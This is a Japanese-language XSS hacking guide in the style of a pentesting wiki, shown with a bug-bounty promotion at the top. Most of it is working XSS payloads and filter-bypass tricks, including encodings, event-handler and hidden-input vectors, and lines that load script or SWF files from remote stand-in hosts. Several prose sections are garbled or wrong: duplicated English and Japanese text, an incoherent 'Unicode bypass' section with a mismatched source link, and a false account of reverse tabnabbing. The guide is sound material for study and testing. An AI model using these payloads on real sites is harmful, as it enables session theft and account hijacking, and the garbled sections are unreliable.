# XSS（クロスサイトスクリプティング）

/<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">

**バグバウンティのヒント**：ハッカーによって作成されたプレミアムなバグバウンティプラットフォームである**Intigriti**に**サインアップ**してください！今すぐ[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)に参加して、最大**$100,000**の報奨金を獲得しましょう！

{% embed url="https://go.intigriti.com/hacktricks" %}

## 方法論

1. コントロールできる**任意の値**（_パラメータ_、_パス_、_ヘッダー_？、_クッキー_？）がHTMLに**反映**されているか、**JS**コードで使用されているかを確認します。
2. 反映/使用されている**コンテキスト**を見つけます。
3. 反映されている場合
1. 使用できる**シンボル**を確認し、それに応じてペイロードを準備します：
1. **生のHTML**で：
1. 新しいHTMLタグを作成できますか？
2. `javascript:`プロトコルをサポートするイベントや属性を使用できますか？
3. 保護をバイパスできますか？
4. HTMLコンテンツがクライアントサイドのJSエンジン（_AngularJS_、_VueJS_、_Mavo_など）によって解釈されている場合、[**クライアントサイドテンプレートインジェクション**](../client-side-template-injection-csti.md)を悪用できる場合があります。
5. JSコードを実行するHTMLタグを作成できない場合、[**Dangling Markup - HTML scriptless injection**](../dangling-markup-html-scriptless-injection.md)を悪用できる場合があります。
2. **HTMLタグ**の内部で：
1. 生のHTMLコンテキストに戻ることはできますか？
2. JSコードを実行するために新しいイベント/属性を作成できますか？
3. トラップされている属性はJSの実行をサポートしていますか？
4. 保護をバイパスできますか？
3. **JavaScriptコード**の内部で：
1. `<script>`タグをエスケープできますか？
2. 文字列をエスケープして異なるJSコードを実行できますか？
3. 入力がテンプレートリテラル\`\`にある場合は？
4. 保護をバイパスできますか？
4. 実行されているJavaScriptの**関数**
1. 実行する関数の名前を指定できます。例：`?callback=alert(1)`
4. **使用されている**場合：
1. **DOM XSS**を悪用できる場合、入力がどのように制御されているか、制御された入力がどのシンクで使用されているかに注意してください。

複雑なXSSを解析する際には、次の情報を知っておくと便利です：

{% content-ref url="debugging-client-side-js.md" %}
[debugging-client-side-js.md](debugging-client-side-js.md)
{% endcontent-ref %}

## 反映された値

XSSを成功させるためには、まず最初に**自分が制御する値がWebページに反映**されているかを見つける必要があります。

* **中間的に反映された**：パラメータの値やパスの値がWebページに反映されている場合、**Reflected XSS**を悪用できる可能性があります。
* **保存されて反映された**：自分が制御する値がサーバーに保存され、ページにアクセスするたびに反映されている場合、**Stored XSS**を悪用できる可能性があります。
* **JSを介してアクセス**される：自分が制御する値がJSを使用してアクセスされている場合、**DOM XSS**を悪用できる可能性があります。

## コンテキスト

XSSを悪用しようとする場合、まず**入力がどこに反映されているか**を知る必要があります。コンテキストによって、さまざまな方法で任意のJSコードを実行できます。

### 生のHTML

入力が**生のHTML**ページに反映されている場合、JSコードを実行するためにいくつかの**HTMLタグ**を悪用する必要があります：`<img`、`<iframe`、`<svg`、`<script` ...これらは使用可能な多くのHTMLタグの一部です。\
また、[クライアントサイドテンプレートインジェクション](../client-side-template-injection-csti.md)に注意してください。

### HTMLタグの属性内部

入力がタグの属性の値の中に反映されている場合、次の方法を試すことができます：

1. 属性とタグの両方から**エスケープ**する（その後、生のHTMLになります）し、悪用するために新しいHTMLタグを作成します：`"><img [...]`
2. 属性からは**エスケープできるが、タグからはエスケープできない**場合（`>`がエンコードされるか削除される）、タグによってはJSコードを実行する**イベント**を作成できます：`" autofocus onfocus=alert(1) x="`
3. 属性から**エスケープできない**場合（`"`がエンコードされるか削除される）、値が反映されている**属性**によって、値をすべて制御するか一部のみ制御するかによって、悪用できるかどうかが異なります。たとえば、`onclick=`のようなイベントを制御できる場合、クリックされたときに任意のコードを実行できます。もう1つの興味深い**例**は、`href`属性で、`javascript:`プロトコルを使用して任意のコードを実行できます：**`href="javascript:alert(1)"`**
4. 入力が「**悪用できないタグ**」に反映されている場合、**`accesskey`**トリックを使用して脆弱性を悪用できます（これを悪用するには、ある種のソーシャルエンジニアが必要です）：**`" accesskey="x" onclick="alert(1)" x="`**

### JavaScriptコードの内部

この場合、入力はHTMLページの**`<script> [...] </script>`**タグ、`.js`ファイルの内部、または**`javascript:`**プロトコルを使用した属性の内部に反映されます。

* **`<script> [...] </script>`**タグの間に反映される場合、入力が引用符のいずれかの内部にある場合でも、`</script>`を注入してこのコンテキストからエスケープすることができます。これは、**ブラウザがまずHTMLタグを解析**し、その後コンテンツを解析するため、注入された`</script>`タグがHTMLコードの内部にあることに気づかないためです。
* JSの文字列の内部に反映されている場合で、前のトリックが機能しない場合は、文字列から**抜け出し**、コードを**実行**し、JSコードを**再構築**する必要があります（エラーがある場合は実行されません）：
* `'-alert(1)-'`
* `';-alert(1)//`
* `\';alert(1)//`
* テンプレートリテラルの内部に反映されている場合、`${ ... }`構文を使用してJS式を**埋め込む**ことができます：`` var greetings = `Hello, ${alert(1)}` ``
* **Unicodeエンコード**を使用して**有効なJavaScriptコード**を書くことができます：
```javascript
\u{61}lert(1)
\u0061lert(1)
\u{0061}lert(1)
```
#### Javascriptのホイスティング

Javascriptのホイスティングは、**使用された後に関数、変数、またはクラスを宣言する**機会を指します。

したがって、**未宣言のオブジェクトの後にJSコードをインジェクト**できるシナリオがある場合、それを宣言することで（エラーをスローする代わりに）構文を**修正**できます。
```javascript
// The function vulnerableFunction is not defined
vulnerableFunction('test', '<INJECTION>');
// You can define it in your injection to execute JS
//Payload1: param='-alert(1)-'')%3b+function+vulnerableFunction(a,b){return+1}%3b
'-alert(1)-''); function vulnerableFunction(a,b){return 1};

//Payload2: param=test')%3bfunction+vulnerableFunction(a,b){return+1}%3balert(1)
test'); function vulnerableFunction(a,b){ return 1 };alert(1)
```

```javascript
// If a variable is not defined, you could define it in the injection
// In the following example var a is not defined
function myFunction(a,b){
return 1
};
myFunction(a, '<INJECTION>')

//Payload: param=test')%3b+var+a+%3d+1%3b+alert(1)%3b
test'); var a = 1; alert(1);
```

```javascript
// If an undeclared class is used, you cannot declare it AFTER being used
var variable = new unexploitableClass();
<INJECTION>
// But you can actually declare it as a function, being able to fix the syntax with something like:
function unexploitableClass() {
return 1;
}
alert(1);
```

```javascript
// Properties are not hoisted
// So the following examples where the 'cookie' attribute doesn´t exist
// cannot be fixed if you can only inject after that code:
test.cookie('leo','INJECTION')
test['cookie','injection']
```
詳細については、Javascriptのホイスティングについては次を参照してください：[https://jlajara.gitlab.io/Javascript\_Hoisting\_in\_XSS\_Scenarios](https://jlajara.gitlab.io/Javascript\_Hoisting\_in\_XSS\_Scenarios)

### Javascript関数

いくつかのウェブページは、**実行する関数の名前をパラメータとして受け入れる**エンドポイントを持っています。実際によく見かける例は、`?callback=callbackFunc`のようなものです。

ユーザーから直接与えられたものが実行されようとしているかどうかを確認する良い方法は、パラメータの値を変更して（例えば 'Vulnerable'に変更して）コンソールでエラーを探すことです：

![](<../../.gitbook/assets/image (651) (2).png>)

脆弱性がある場合、値を送信するだけで**アラートをトリガー**することができる可能性があります：**`?callback=alert(1)`**。ただし、これらのエンドポイントでは、文字、数字、ドット、アンダースコアのみを許可するようにコンテンツを**検証する**ことが非常に一般的です（**`[\w\._]`**）。

ただし、その制限があっても、いくつかのアクションを実行することは可能です。これは、有効な文字を使用してDOM内の任意の要素に**アクセス**できるためです：

![](<../../.gitbook/assets/image (662).png>)

これに役立ついくつかの関数：
```
firstElementChild
lastElementChild
nextElementSibiling
lastElementSibiling
parentElement
```
あなたは直接**Javascriptの関数をトリガー**することも試すことができます：`obj.sales.delOrders`。

ただし、通常、指定された関数を実行するエンドポイントは、DOMがあまり興味深くないエンドポイントです。**同じオリジンの他のページ**には、より興味深いDOMがあり、さらに多くのアクションを実行できます。

したがって、異なるDOMでこの脆弱性を**悪用するために**、**Same Origin Method Execution (SOME)** の攻撃手法が開発されました：

{% content-ref url="some-same-origin-method-execution.md" %}
[some-same-origin-method-execution.md](some-same-origin-method-execution.md)
{% endcontent-ref %}

### DOM

**JSコード**が、`location.href`のような**攻撃者によって制御されるデータ**を**安全に使用していない**場合があります。攻撃者はこれを悪用して任意のJSコードを実行することができます。

{% content-ref url="dom-xss.md" %}
[dom-xss.md](dom-xss.md)
{% endcontent-ref %}

### **Universal XSS**

この種のXSSは**どこにでも**見つけることができます。これらは単にWebアプリケーションのクライアントの脆弱性に依存するのではなく、**任意の****コンテキスト**に依存します。この種の**任意のJavaScriptの実行**は、RCEを取得したり、クライアントやサーバーで**任意のファイル**を**読み取る**ことさえ悪用することができます。\
いくつかの**例**：

{% content-ref url="server-side-xss-dynamic-pdf.md" %}
[server-side-xss-dynamic-pdf.md](server-side-xss-dynamic-pdf.md)
{% endcontent-ref %}

{% content-ref url="../../network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps/" %}
[xss-to-rce-electron-desktop-apps](../../network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps/)
{% endcontent-ref %}

## WAFバイパスエンコーディング画像

![from https://twitter.com/hackerscrolls/status/1273254212546281473?s=21](../../.gitbook/assets/eaubb2ex0aerank.jpg)

## 生のHTML内に注入する

入力がHTMLページ内に**反映**される場合、またはこのコンテキストでHTMLコードをエスケープして注入できる場合、**最初に**行うべきことは、`<`を使用して新しいタグを作成できるかどうかを確認することです：単にその**文字**を**反映**させ、それが**HTMLエンコード**されるか、**削除**されるか、または**変更なしで反映**されるかを確認します。**最後の場合にのみ、このケースを悪用することができます**。\
このような場合には、[**クライアントサイドテンプレートインジェクション**](../client-side-template-injection-csti.md)**も念頭に置いてください**。\
_**注意：HTMLコメントは`-->`または`--!>`を使用して閉じることができます**_

この場合、ブラックリスト/ホワイトリストが使用されていない場合、次のようなペイロードを使用できます：
```javascript
<script>alert(1)</script>
<img src=x onerror=alert(1) />
<svg onload=alert('XSS')>
```
しかし、タグ/属性のブラックリスト/ホワイトリストが使用されている場合、作成できる**どのタグをブルートフォースするか**を特定する必要があります。\
許可されているタグが**どれかを特定**したら、見つかった有効なタグ内の属性/イベントをブルートフォースして、どのようにコンテキストを攻撃できるかを確認する必要があります。

### タグ/イベントのブルートフォース

[**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)にアクセスし、_**Copy tags to clipboard**_ をクリックします。次に、Burp Intruderを使用してすべてのタグを送信し、WAFによって悪意のあるタグとして検出されなかったかどうかを確認します。使用できるタグがわかったら、有効なタグを使用してすべてのイベントを**ブルートフォース**します（同じウェブページで_Copy events to clipboard_をクリックし、前と同じ手順を実行します）。

### カスタムタグ

有効なHTMLタグが見つからなかった場合、カスタムタグを作成して`onfocus`属性でJSコードを実行することができます。XSSリクエストでは、URLの末尾に`#`を付けてページが**そのオブジェクトにフォーカス**し、コードを**実行**するようにする必要があります。
```
/?search=<xss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1>#x
```
### ブラックリスト回避

もしブラックリストが使用されている場合、いくつかの愚かなトリックを使って回避することができます。
```javascript
//Random capitalization
<script> --> <ScrIpT>
<img --> <ImG

//Double tag, in case just the first match is removed
<script><script>
<scr<script>ipt>
<SCRscriptIPT>alert(1)</SCRscriptIPT>

//You can substitude the space to separate attributes for:
/
/*%00/
/%00*/
%2F
%0D
%0C
%0A
%09

//Unexpected parent tags
<svg><x><script>alert('1'&#41</x>

//Unexpected weird attributes
<script x>
<script a="1234">
<script ~~~>
<script/random>alert(1)</script>
<script      ///Note the newline
>alert(1)</script>
<scr\x00ipt>alert(1)</scr\x00ipt>

//Not closing tag, ending with " <" or " //"
<iframe SRC="javascript:alert('XSS');" <
<iframe SRC="javascript:alert('XSS');" //

//Extra open
<<script>alert("XSS");//<</script>

//Just weird an unexpected, use your imagination
<</script/script><script>
<input type=image src onerror="prompt(1)">

//Using `` instead of parenthesis
onerror=alert`1`

//Use more than one
<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS=alert`1` //
```
### 長さバイパス（小さなXSS）

{% hint style="info" %}
**さまざまな環境向けのさらなる小さなXSS** ペイロードは[**こちら**](https://github.com/terjanq/Tiny-XSS-Payloads)と[**こちら**](https://tinyxss.terjanq.me)で見つけることができます。
{% endhint %}
```html
<!-- Taken from the blog of Jorge Lajara -->
<svg/onload=alert``>
<script src=//aa.es>
<script src=//℡㏛.pw>
```
最後の方法は、5つに展開される2つのUnicode文字を使用します：telsr\
これらの文字の詳細は[こちら](https://www.unicode.org/charts/normalization/)で確認できます。\
文字がどのように分解されるかを確認するには、[こちら](https://www.compart.com/en/unicode/U+2121)をチェックしてください。

### XSSクリックジャッキング

脆弱性を悪用するために、**ユーザーがリンクやフォームをクリックする必要がある**場合、[**クリックジャッキング**](../clickjacking.md#xss-clickjacking)を悪用してみることができます（ページが脆弱な場合）。

### 不可能 - ダングリングマークアップ

**HTMLタグにJSコードを実行する属性を作成することは不可能**だと思っている場合は、[**ダングリングマークアップ**](../dangling-markup-html-scriptless-injection.md)をチェックしてみてください。なぜなら、JSコードを実行せずに脆弱性を**悪用**することができるからです。

## HTMLタグ内への挿入

### タグ内/属性値からのエスケープ

もし**HTMLタグ内にいる**場合、まずはタグから**エスケープ**して、[前のセクション](./#injecting-inside-raw-html)で言及されているいくつかのテクニックを使用してJSコードを実行してみることができます。\
もし**タグからエスケープできない**場合は、タグ内に新しい属性を作成してJSコードを実行しようとすることができます。例えば、次のようなペイロードを使用することができます（この例では、ダブルクォートを使用して属性からエスケープしていますが、入力が直接タグ内に反映される場合は必要ありません）：
```bash
" autofocus onfocus=alert(document.domain) x="
" onfocus=alert(1) id=x tabindex=0 style=display:block>#x #Access http://site.com/?#x t
```
**スタイルイベント**

Style events are a type of Cross-Site Scripting (XSS) attack that allows an attacker to inject malicious code into a website by exploiting vulnerabilities in the way the website handles user input. This type of attack occurs when the website allows users to input data that is then used to dynamically generate CSS styles.

スタイルイベントは、クロスサイトスクリプティング（XSS）攻撃の一種であり、攻撃者がウェブサイト内に悪意のあるコードを注入することができるようになります。これは、ウェブサイトがユーザーの入力を処理する方法に存在する脆弱性を悪用することで発生します。この攻撃は、ウェブサイトがユーザーにデータの入力を許可し、それを動的に生成されるCSSスタイルに使用する場合に発生します。

An attacker can exploit this vulnerability by injecting malicious code into the user input fields that are used to generate CSS styles. When the website processes this input and generates the CSS styles, the injected code is executed, allowing the attacker to perform various malicious actions such as stealing sensitive information, hijacking user sessions, or defacing the website.

攻撃者は、CSSスタイルを生成するために使用されるユーザー入力フィールドに悪意のあるコードを注入することで、この脆弱性を悪用することができます。ウェブサイトがこの入力を処理し、CSSスタイルを生成する際に、注入されたコードが実行され、攻撃者は機密情報の盗難、ユーザーセッションの乗っ取り、またはウェブサイトの改ざんなど、さまざまな悪意のある行動を実行することができます。

To prevent style events XSS attacks, it is important to properly validate and sanitize user input before using it to generate CSS styles. This can be done by implementing input validation and output encoding techniques, such as using a Content Security Policy (CSP) to restrict the types of content that can be loaded on a website.

スタイルイベントXSS攻撃を防ぐためには、CSSスタイルを生成する前に、ユーザーの入力を適切に検証およびサニタイズすることが重要です。これは、入力検証および出力エンコーディング技術を実装することによって行うことができます。たとえば、コンテンツセキュリティポリシー（CSP）を使用して、ウェブサイトで読み込むことができるコンテンツの種類を制限する方法があります。
```python
<p style="animation: x;" onanimationstart="alert()">XSS</p>
<p style="animation: x;" onanimationend="alert()">XSS</p>

#ayload that injects an invisible overlay that will trigger a payload if anywhere on the page is clicked:
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.5);z-index: 5000;" onclick="alert(1)"></div>
#moving your mouse anywhere over the page (0-click-ish):
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.0);z-index: 5000;" onmouseover="alert(1)"></div>
```
### 属性内部で

属性から**エスケープすることができなくても**（`"`がエンコードされたり削除されたりする）、**どの属性**に値が反映されるかによって、値を完全に制御するか一部のみ制御するかによって、それを悪用することができます。**例えば**、`onclick=`のようなイベントを制御できる場合、クリックされたときに任意のコードを実行することができます。\
もう一つの興味深い**例**は、`href`属性です。ここでは、`javascript:`プロトコルを使用して任意のコードを実行できます：**`href="javascript:alert(1)"`**

**HTMLエンコーディング/URLエンコードを使用したイベント内のバイパス**

HTMLタグの属性の値内部の**HTMLエンコードされた文字**は、実行時に**デコード**されます。したがって、次のようなものは有効になります（ペイロードは太字で示されています）：`<a id="author" href="http://none" onclick="var tracker='http://foo?`**`&apos;-alert(1)-&apos;`**`';">Go Back </a>`

**どの種類のHTMLエンコードでも有効**であることに注意してください：
```javascript
//HTML entities
&apos;-alert(1)-&apos;
//HTML hex without zeros
&#x27-alert(1)-&#x27
//HTML hex with zeros
&#x00027-alert(1)-&#x00027
//HTML dec without zeros
&#39-alert(1)-&#39
//HTML dec with zeros
&#00039-alert(1)-&#00039

<a href="javascript:var a='&apos;-alert(1)-&apos;'">a</a>
<a href="&#106;avascript:alert(2)">a</a>
<a href="jav&#x61script:alert(3)">a</a>
```
**URLエンコードも機能します。**
```python
<a href="https://example.com/lol%22onmouseover=%22prompt(1);%20img.png">Click</a>
```
**Unicodeエンコードを使用して内部イベントをバイパスする方法**

---

## 概要

このテクニックでは、Unicodeエンコードを使用して内部イベントをバイパスし、クロスサイトスクリプティング（XSS）攻撃を実行します。内部イベントは、HTML要素に直接埋め込まれたJavaScriptコードであり、ユーザーのブラウザ上で実行されます。通常、内部イベントは特定のトリガーに応じて実行されますが、Unicodeエンコードを使用することで、イベントの実行を回避することができます。

## 攻撃手法

以下の手順に従って、Unicodeエンコードを使用して内部イベントをバイパスする方法を実行します。

1. 攻撃者は、脆弱なウェブアプリケーションの入力フィールドに対して、XSSペイロードを挿入します。

2. 攻撃者は、XSSペイロード内のJavaScriptコードをUnicodeエンコードします。これにより、内部イベントが実行されなくなります。

3. 攻撃者は、エンコードされたXSSペイロードを送信し、脆弱なウェブアプリケーションがそれを処理すると、エンコードが解除され、内部イベントが実行されます。

4. ユーザーが攻撃者の挿入したXSSペイロードを実行すると、攻撃者はユーザーのセッション情報やクッキーなどの機密情報を盗み出すことができます。

## 対策方法

以下の対策方法を実施することで、Unicodeエンコードを使用した内部イベントのバイパス攻撃から保護することができます。

- 入力検証とエスケープ処理を適切に実施することで、ユーザーからの入力データを信頼できる形式に変換します。

- セキュリティヘッダを適切に設定し、XSS攻撃を防止します。

- セキュリティ意識の高い開発者教育を実施し、セキュリティに関するベストプラクティスを徹底します。

---

*原文リンク: [pentesting-web/xss-cross-site-scripting/README.md](https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Cross_Site_Scripting/04-XSS_Cross_Site_Scripting.md)*
```javascript
//For some reason you can use unicode to encode "alert" but not "(1)"
<img src onerror=\u0061\u006C\u0065\u0072\u0074(1) />
<img src onerror=\u{61}\u{6C}\u{65}\u{72}\u{74}(1) />
```
### 属性内の特殊プロトコル

ここでは、いくつかの場所で**`javascript:`**または**`data:`**のプロトコルを使用して、**任意のJSコードを実行**することができます。一部はユーザーの対話を必要とし、一部は必要ありません。
```javascript
javascript:alert(1)
JavaSCript:alert(1)
javascript:%61%6c%65%72%74%28%31%29 //URL encode
javascript&colon;alert(1)
javascript&#x003A;alert(1)
javascript&#58;alert(1)
&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3aalert(1)
java        //Note the new line
script:alert(1)

data:text/html,<script>alert(1)</script>
DaTa:text/html,<script>alert(1)</script>
data:text/html;charset=iso-8859-7,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e
data:text/html;charset=UTF-8,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
data:text/html;charset=thing;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg
data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==
```
**これらのプロトコルを注入できる場所**

**一般的には**、`javascript:`プロトコルは`href`属性を受け入れる**任意のタグ**と、**`src`属性を受け入れるほとんどのタグ**（ただし`<img>`は除く）で使用することができます。
```markup
<a href="javascript:alert(1)">
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">
<form action="javascript:alert(1)"><button>send</button></form>
<form id=x></form><button form="x" formaction="javascript:alert(1)">send</button>
<object data=javascript:alert(3)>
<iframe src=javascript:alert(2)>
<embed src=javascript:alert(1)>

<object data="data:text/html,<script>alert(5)</script>">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+" type="image/svg+xml" AllowScriptAccess="always"></embed>
<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="></embed>
<iframe src="data:text/html,<script>alert(5)</script>"></iframe>

//Special cases
<object data="//hacker.site/xss.swf"> .//https://github.com/evilcos/xss.swf
<embed code="//hacker.site/xss.swf" allowscriptaccess=always> //https://github.com/evilcos/xss.swf
<iframe srcdoc="<svg onload=alert(4);>">
```
**他の曖昧化のトリック**

_**この場合、前のセクションで説明したHTMLエンコーディングとUnicodeエンコーディングのトリックも有効です。なぜなら、属性内にいるからです。**_
```javascript
<a href="javascript:var a='&apos;-alert(1)-&apos;'">
```
さらに、これらのケースには別の**便利なトリック**があります: **`javascript:...`内の入力がURLエンコードされている場合でも、実行される前にURLデコードされます。**ですので、**シングルクォート**を使用して**文字列**から**エスケープ**する必要があり、**URLエンコードされている**ことがわかっている場合でも、**問題ありません**。実行時には**シングルクォート**として**解釈**されます。
```javascript
&apos;-alert(1)-&apos;
%27-alert(1)-%27
<iframe src=javascript:%61%6c%65%72%74%28%31%29></iframe>
```
注意してください。`URLエンコード + HTMLエンコード`を任意の順序で使用しても、**ペイロード**をエンコードすることはできませんが、**ペイロード内でそれらを混在させることはできます**。

**`javascript:`を使用した16進数と8進数のエンコード**

`iframe`の`src`属性（少なくとも）内で、**HTMLタグを実行するために**、**16進数**と**8進数のエンコード**を使用することができます。
```javascript
//Encoded: <svg onload=alert(1)>
// This WORKS
<iframe src=javascript:'\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e' />
<iframe src=javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76' />

//Encoded: alert(1)
// This doesn't work
<svg onload=javascript:'\x61\x6c\x65\x72\x74\x28\x31\x29' />
<svg onload=javascript:'\141\154\145\162\164\50\61\51' />
```
### リバースタブナビング

Reverse tab nabbing（リバースタブナビング）は、ウェブアプリケーションの脆弱性であり、攻撃者が悪意のあるウェブページを作成し、被害者がそのページを閉じる際に、別のウェブサイトにリダイレクトされることを利用します。

この攻撃は、被害者が脆弱なウェブアプリケーションにログインしている場合に特に危険です。攻撃者は、被害者がログインしているウェブサイトのタブを開き、そのタブを閉じるときに別のウェブサイトにリダイレクトします。被害者は、自分がログアウトしたと思っているにもかかわらず、実際には攻撃者の制御下にあるウェブサイトにリダイレクトされてしまいます。

この攻撃を防ぐためには、ウェブアプリケーションは適切なセッション管理を実装する必要があります。また、ユーザーに対しても注意喚起を行い、信頼できるウェブサイト以外のリンクをクリックしないようにすることが重要です。
```javascript
<a target="_blank" rel="opener"
```
任意の **`<a href=`** タグに、**`target="_blank"`** と **`rel="opener"`** 属性を含む任意の URL を注入できる場合、次のページをチェックしてこの動作を悪用できます：

{% content-ref url="../reverse-tab-nabbing.md" %}
[reverse-tab-nabbing.md](../reverse-tab-nabbing.md)
{% endcontent-ref %}

### イベントハンドラーバイパス

まず、有用な **"on" イベントハンドラー** については、このページ ([https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)) をチェックしてください。\
もし、ブラックリストによってこのイベントハンドラーの作成が制限されている場合は、以下のバイパス方法を試してみることができます：
```javascript
<svg onload%09=alert(1)> //No safari
<svg %09onload=alert(1)>
<svg %09onload%20=alert(1)>
<svg onload%09%20%28%2c%3b=alert(1)>

//chars allowed between the onevent and the "="
IExplorer: %09 %0B %0C %020 %3B
Chrome: %09 %20 %28 %2C %3B
Safari: %2C %3B
Firefox: %09 %20 %28 %2C %3B
Opera: %09 %20 %2C %3B
Android: %09 %20 %28 %2C %3B
```
### "Unexploitable tags"（hidden input、link、canonical、meta）におけるXSS

[**こちら**](https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags)から、**隠し入力を悪用することが可能になりました。**
```html
<button popvertarget="x">Click me</button>
<input type="hidden" value="y" popover id="x" onbeforetoggle=alert(1)>
```
そして、**メタタグ**内では：
```html
<!-- Injection inside meta attribute-->
<meta name="apple-mobile-web-app-title" content=""Twitter popover id="newsletter" onbeforetoggle=alert(2) />
<!-- Existing target-->
<button popovertarget="newsletter">Subscribe to newsletter</button>
<div popover id="newsletter">Newsletter popup</div>
```
[**ここ**](https://portswigger.net/research/xss-in-hidden-input-fields)から：**隠し属性内でXSSペイロードを実行**することができます。ただし、**被害者**に**キーの組み合わせ**を押させる必要があります。Firefox Windows/Linuxでは、キーの組み合わせは**ALT+SHIFT+X**で、OS Xでは**CTRL+ALT+X**です。アクセスキー属性で異なるキーを使用して異なるキーの組み合わせを指定することもできます。以下はベクトルです：
```markup
<input type="hidden" accesskey="X" onclick="alert(1)">
```
**XSSペイロードは次のようになります：`" accesskey="x" onclick="alert(1)" x="`**

### ブラックリスト回避

このセクションでは、さまざまなエンコーディングを使用したトリックがすでに公開されています。次の場所で使用できる場所を学ぶために**戻ってください：**

* **HTMLエンコーディング（HTMLタグ）**
* **Unicodeエンコーディング（有効なJSコードになる場合）：** `\u0061lert(1)`
* **URLエンコーディング**
* **16進数および8進数エンコーディング**
* **データエンコーディング**

**HTMLタグと属性の回避**

[前のセクションのブラックリスト回避](./#blacklist-bypasses)を読んでください。

**JavaScriptコードの回避**

[次のセクションのJavaScriptブラックリスト回避テクニック](./#javascript-bypass-blacklists-techniques)を読んでください。

### CSS-Gadgets

もしウェブの非常に小さな部分でXSSを見つけた場合（たとえば、フッターの小さなリンクにonmouseover要素が必要な場合）、要素が占めるスペースを変更してリンクが発火する可能性を最大化することができます。

例えば、次のように要素にスタイリングを追加することができます：`position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: red; opacity: 0.5`

しかし、もしWAFがstyle属性をフィルタリングしている場合、CSS Styling Gadgetsを使用することができます。例えば、次のようなものを見つけた場合：

> .test {display:block; color: blue; width: 100%\}

および

> \#someid {top: 0; font-family: Tahoma;}

今、リンクを修正して次の形式にすることができます：

> \<a href=”” id=someid class=test onclick=alert() a=””>

このトリックは[https://medium.com/@skavans\_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703](https://medium.com/@skavans\_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703)から取得されました。

## JavaScriptコード内への注入

この場合、**入力**は`.js`ファイルのJSコード内、または`<script>...</script>`タグの間、またはJSコードを実行できるHTMLイベントの間、または`javascript:`プロトコルを受け入れる属性の間に**反映**されます。

### \<script>タグのエスケープ

もしコードが`<script> [...] var input = 'reflected data' [...] </script>`内に挿入されている場合、簡単に\<script>タグを**エスケープ**することができます：
```javascript
</script><img src=1 onerror=alert(document.domain)>
```
注意してください、この例では**シングルクォートを閉じていません**が、それは必要ありません。なぜなら、**ブラウザはまずHTMLパースを実行**してスクリプトのブロックを含むページ要素を識別し、その後にJavaScriptパースを実行して埋め込まれたスクリプトを理解して実行するからです。

### JSコード内部

もし`<>`がサニタイズされている場合でも、入力が**配置されている場所**で文字列を**エスケープ**し、任意のJSを**実行**することができます。JSの構文を**修正する**ことが重要です。なぜなら、エラーがある場合、JSコードは実行されないからです。
```
'-alert(document.domain)-'
';alert(document.domain)//
\';alert(document.domain)//
```
### テンプレートリテラル \`\`

JSでは、シングルクォートやダブルクォート以外にも、**バックティック** **` `` `** を使用して**文字列**を構築することができます。これはテンプレートリテラルとして知られており、`${ ... }` 構文を使用して**埋め込まれたJS式**を実行することができます。\
したがって、バックティックを使用しているJS文字列内に入力が**反映**されている場合、`${ ... }` 構文を悪用して**任意のJSコード**を実行することができます。

これは以下のように悪用されることがあります：
```javascript
`${alert(1)}`
`${`${`${`${alert(1)}`}`}`}`
```

```````````````javascript
// This is valid JS code, because each time the function returns itself it's recalled with ``
function loop(){return loop}
loop``````````````
```````````````
### エンコードされたコードの実行

